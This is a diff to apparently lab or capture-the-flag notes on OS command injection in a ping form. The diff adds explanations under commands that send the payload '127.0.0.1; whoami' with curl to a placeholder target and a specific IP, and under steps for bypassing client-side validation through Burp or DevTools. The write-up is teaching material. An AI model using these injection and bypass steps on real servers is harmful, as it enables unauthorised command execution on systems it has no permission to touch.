@@ -25,6 +25,7 @@ ping -c 1 127.0.0.1; whoami
 # PING 127.0.0.1 ... 1 packets transmitted, 1 received
 # yourusername
 ```
+> Verifies the payload works locally before sending it to the target. If `;` separates the commands correctly on your machine, it will behave the same way on the target server.
 
 ---
 
@@ -36,6 +37,7 @@ When the HTML has `pattern="..."`, the browser blocks malformed submissions clie
 ```bash
 curl -sk -X POST "http://TARGET/" --data-urlencode "ip=127.0.0.1; whoami"
 ```
+> Sends the injection directly as a POST request, bypassing all browser-side validation. The `--data-urlencode` flag handles the semicolon and space automatically.
 
 ### Method 2 — Burp Repeater
 1. Submit a valid request (IP only) through the browser
@@ -47,7 +49,7 @@ curl -sk -X POST "http://TARGET/" --data-urlencode "ip=127.0.0.1; whoami"
 ### Method 3 — Remove `pattern` attribute in DevTools
 1. F12 → Inspector → find `<input pattern="...">` element
 2. Delete the `pattern` attribute
-3. Now the browser submits anything
+3. The browser will now submit any value without validation
 
 ---
 
@@ -88,12 +90,14 @@ Most useful examples:
 curl -sk -X POST "http://154.57.164.66:32362/" --data-urlencode "ip=127.0.0.1; whoami"
 # Response includes ping output + whoami output (e.g., "www-data")
 ```
+> Sends the injection via curl. The response includes both the ping result and the `whoami` output, confirming RCE.
 
 ### Q1 — Find the line where front-end validation lives
 
 ```bash
 curl -sk "http://154.57.164.66:32362/" | cat -n | grep -E 'pattern=|validate|onsubmit'
 ```
+> Fetches the page source, adds line numbers with `cat -n`, then searches for common validation attributes. The line number of the `pattern="..."` attribute is the answer.
 
 Line 17:
 ```html
